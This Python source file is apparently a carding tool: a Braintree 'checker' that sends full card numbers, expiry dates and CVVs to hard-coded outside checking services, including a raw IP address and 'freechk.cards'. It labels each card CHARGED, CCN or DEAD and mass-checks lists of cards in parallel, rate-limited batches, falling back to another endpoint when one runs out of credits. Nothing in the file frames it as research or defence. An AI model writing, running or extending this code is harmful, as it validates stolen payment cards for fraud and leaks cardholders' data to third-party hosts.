import asyncio
import aiohttp
import time as time_module

FALLBACK_URLS = [
    "http://15.204.130.9:6969/check?cc={lista}&gate=braintree",
    "https://freechk.cards/free/braintree.php?lista={lista}",
    "https://api.nyvexis.com/braintree/?lista={lista_short}",
]

def _parse_b3_response(text: str, data: dict) -> dict:
    status = str(data.get('status', '')).upper()
    msg = data.get('message', data.get('response', data.get('result', data.get('msg', ''))))
    if not msg:
        msg = text[:200] if text else str(data)[:200]
    msg = str(msg).replace('_', ' ')
    text_lower = (msg + status).lower()
    if any(x in text_lower for x in ['live', 'charged', 'success', 'approved', 'valid', 'ccn', 'cvv', 'cvc', 'insufficient']):
        if any(x in text_lower for x in ['ccn', 'cvv', 'cvc', 'insufficient']):
            return {'status': 'CCN', 'response': msg}
        return {'status': 'CHARGED', 'response': msg}
    elif any(x in text_lower for x in ['dead', 'decline', 'invalid', 'expired', 'fail', 'error', 'rejected']):
        return {'status': 'DEAD', 'response': msg}
    return {'status': 'DEAD', 'response': msg or 'No response'}

async def check_b3(cc, mm, yy, cvv):
    """Check card via Braintree using multiple fallback endpoints"""
    year = f'20{yy}' if len(yy) == 2 else yy
    lista = f'{cc}|{mm}|{year}|{cvv}'
    lista_short = f'{cc}|{mm}|{yy}|{cvv}'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    for url_tpl in FALLBACK_URLS:
        url = url_tpl.format(lista=lista, lista_short=lista_short)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    text = await resp.text()
                    if resp.status != 200 or not text.strip():
                        continue
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        data = {}

                    low = text.lower()
                    if any(k in low for k in ['no have credits', 'no credits', 'out of credits',
                                              'buy credits', 'credit limit', 'api limit']):
                        continue

                    return _parse_b3_response(text, data if isinstance(data, dict) else {})
        except (asyncio.TimeoutError, Exception):
            continue

    return {'status': 'ERROR', 'response': 'All Braintree endpoints unreachable'}


async def mass_check_b3(cards: list, batch_size: int = 5, delay: float = 1.0):
    """Mass check cards with 5 parallel batches and 1 sec delay"""
    results = []

    for i in range(0, len(cards), batch_size):
        batch = cards[i:i + batch_size]

        tasks = []
        for card_data in batch:
            parts = card_data.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                tasks.append(check_b3(cc, mm, yy, cvv))

        if tasks:
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, result in enumerate(batch_results):
                card = batch[j] if j < len(batch) else "Unknown"
                if isinstance(result, Exception):
                    results.append({'card': card, 'status': 'ERROR', 'response': str(result)[:50]})
                else:
                    results.append({'card': card, **result})

        if i + batch_size < len(cards):
            await asyncio.sleep(delay)

    return results
